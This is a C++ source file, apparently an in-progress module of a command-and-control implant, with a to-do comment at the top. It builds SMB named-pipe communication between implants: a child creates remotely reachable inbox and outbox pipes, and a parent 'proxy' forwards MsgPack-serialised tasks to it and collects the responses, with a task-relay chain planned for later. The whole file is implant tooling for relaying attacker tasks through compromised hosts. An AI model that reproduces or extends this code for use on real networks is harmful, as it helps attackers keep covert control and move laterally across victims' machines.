/*

SMB Comms

Need:

(listener)
- [ ] Setup pipes (sets up smb pipes)

(both)
- [ ] Read pipe
- [ ] Write pipe

and an internal chain map that tells what my implant is connected to, and what to send to/relay tasks to (later)

*/
//temp as .h for now
#pragma once

#include <windows.h>
#include <iostream>
#include <vector>
#include <queue>
#include <mutex>

//Awaits for a parent to connect to the pipe. IF we don't have this, we get an immediate
//536 pipe error: Waiting for a process to open the other end of the pipe.

bool await_client_connection(HANDLE h_pipe, const std::string& pipe_name) {
    OVERLAPPED ol = { 0 };
    ol.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

    std::cout << "[*] Waiting for parent to connect to " << pipe_name << " pipe..." << std::endl;

    // Issue the connection request
    BOOL connected = ConnectNamedPipe(h_pipe, &ol);

    if (!connected) {
        DWORD err = GetLastError();
        if (err == ERROR_IO_PENDING) {
            // ERROR_IO_PENDING (or 536) means it is successfully listening!
            // This line physically halts the implant until the Parent PoC connects.
            WaitForSingleObject(ol.hEvent, INFINITE);
            std::cout << "[+] Parent connected to " << pipe_name << "!" << std::endl;
        }
        else if (err == ERROR_PIPE_CONNECTED) {
            // Parent was already waiting and connected instantly
            std::cout << "[+] Parent connected to " << pipe_name << " instantly!" << std::endl;
        }
        else {
            std::cerr << "[-] ConnectNamedPipe failed: " << err << std::endl;
            CloseHandle(ol.hEvent);
            return false;
        }
    }

    CloseHandle(ol.hEvent);
    return true;
}


int register_pipe(HANDLE& h_inbox_pipe, HANDLE& h_outbox_pipe) {
    std::wstring wstr_pipe_inbox = L"\\\\.\\pipe\\inbox2";

    // ---------------------------------------------------------
    // INBOX PIPE CREATION (FILE_FLAG_OVERLAPPED Added)
    // ---------------------------------------------------------
    h_inbox_pipe = CreateNamedPipeW(
        wstr_pipe_inbox.c_str(),
        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, // REQUIRED for asynchronous wait            
        PIPE_TYPE_MESSAGE |
        PIPE_READMODE_MESSAGE |
        PIPE_WAIT |
        PIPE_ACCEPT_REMOTE_CLIENTS,
        1,
        4096,
        4096,
        0,
        NULL
    );

    if (h_inbox_pipe == INVALID_HANDLE_VALUE) return 1;

    std::wstring wstr_pipe_outbox = L"\\\\.\\pipe\\outbox2";

    // ---------------------------------------------------------
    // OUTBOX PIPE CREATION (FILE_FLAG_OVERLAPPED Added)
    // ---------------------------------------------------------
    h_outbox_pipe = CreateNamedPipeW(
        wstr_pipe_outbox.c_str(),
        PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, // REQUIRED for asynchronous wait         
        PIPE_TYPE_MESSAGE |
        PIPE_READMODE_MESSAGE |
        PIPE_WAIT |
        PIPE_ACCEPT_REMOTE_CLIENTS,
        1,
        4096,
        4096,
        0,
        NULL
    );

    if (h_outbox_pipe == INVALID_HANDLE_VALUE) return 1;

    // Must await connection for both pipes before continuing
    if (!await_client_connection(h_inbox_pipe, "INBOX")) return 1;
    if (!await_client_connection(h_outbox_pipe, "OUTBOX")) return 1;

    return 0;
}


//actual logic for feeding child pipe
nlohmann::json push_to_child(HANDLE h_write, HANDLE h_read, const nlohmann::json& raw_task, bool expect_response) {
    // Wrap the single task in an array (child routing expects a list)
    nlohmann::json task_list = nlohmann::json::array();
    task_list.push_back(raw_task);

    // Serialize task into MsgPack
    std::vector<uint8_t> msgpack_payload = nlohmann::json::to_msgpack(task_list);

    // Send task to child
    DWORD bytes_written = 0;
    std::cout << "[*] Forwarding task to child..." << std::endl;
    WriteFile(h_write, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL);
    std::cout << "[+] Wrote " << bytes_written << " bytes to child inbox." << std::endl;

    // Wait for a response, if we expect one (i.e., after task completion)
    if (!expect_response) {
        std::cout << "[*] No response expected for this packet. Moving on.\n" << std::endl;
        return nlohmann::json{};
    }

    std::cout << "[*] Waiting for response from child worker..." << std::endl;
    std::vector<uint8_t> buffer(4096);
    DWORD bytes_read = 0;

    if (ReadFile(h_read, buffer.data(), static_cast<DWORD>(buffer.size()), &bytes_read, NULL)) {
        std::cout << "[+] SUCCESS! Received " << bytes_read << " bytes." << std::endl;
        std::vector<uint8_t> response_bytes(buffer.begin(), buffer.begin() + bytes_read);
        try {
            nlohmann::json response_json = nlohmann::json::from_msgpack(response_bytes);
            std::cout << "[+] Unpacked Response: \n" << response_json.dump(4) << "\n" << std::endl;
            return response_json;
        }
        catch (...) {
            std::cerr << "[-] Failed to unpack response.\n" << std::endl;
            return nlohmann::json{};
        }
    }
    else {
        std::cerr << "[-] Read failed: " << GetLastError() << "\n" << std::endl;
        return nlohmann::json{};

    }
    return nlohmann::json{};
}

nlohmann::json route_task_to_child_implant(const nlohmann::json& task) {
    std::cout << "[*] Parent Proxy POC starting..." << std::endl;

    //placeholder, add as arg/lookup here to get what pipe names the child has
    std::wstring pipe_inbox = L"\\\\.\\pipe\\inbox2";
    std::wstring pipe_outbox = L"\\\\.\\pipe\\outbox2";

    std::cout << "[*] Waiting for child pipes..." << std::endl;
    //wait on the pipes
    WaitNamedPipeW(pipe_inbox.c_str(), NMPWAIT_WAIT_FOREVER);
    WaitNamedPipeW(pipe_outbox.c_str(), NMPWAIT_WAIT_FOREVER);

    // Open handles ONCE so the connection stays alive across multiple feeder calls
    HANDLE h_parent_write = CreateFileW(pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE h_parent_read = CreateFileW(pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (h_parent_write == INVALID_HANDLE_VALUE || h_parent_read == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to connect." << std::endl;
        //return blank
        return nlohmann::json{};
    }
    std::cout << "[+] Connected to child implant!\n" << std::endl;

    std::string target_uuid = "11111111-2222-3333-4444-555555555555";

    //send data down to 
    std::cout << "[*] Feeding Task..." << std::endl;
    nlohmann::json task_results = push_to_child(h_parent_write, h_parent_read, task, true);

    // nuke the handles we created for the child
    CloseHandle(h_parent_write);
    CloseHandle(h_parent_read);
    
    return task_results;
}

//std::vector<uint8_t> read_from_pipe(HANDLE pipe, OVERLAPPED* ol) {
//    std::vector<uint8_t> inbox_data(4096);
//    DWORD bytes_read = 0;
//
//    // Read asynchronously
//    BOOL success = ReadFile(
//        pipe,
//        inbox_data.data(),
//        static_cast<DWORD>(inbox_data.size()),
//        &bytes_read,
//        ol // Pass the overlapped structure
//    );
//
//    // If it's pending, wait for the result
//    if (!success && GetLastError() == ERROR_IO_PENDING) {
//        // The event loop usually handles the wait, but if we are here, 
//        // the event was signaled, so we get the overlapped result
//        GetOverlappedResult(pipe, ol, &bytes_read, TRUE);
//    }
//
//    inbox_data.resize(bytes_read);
//    return inbox_data;
//}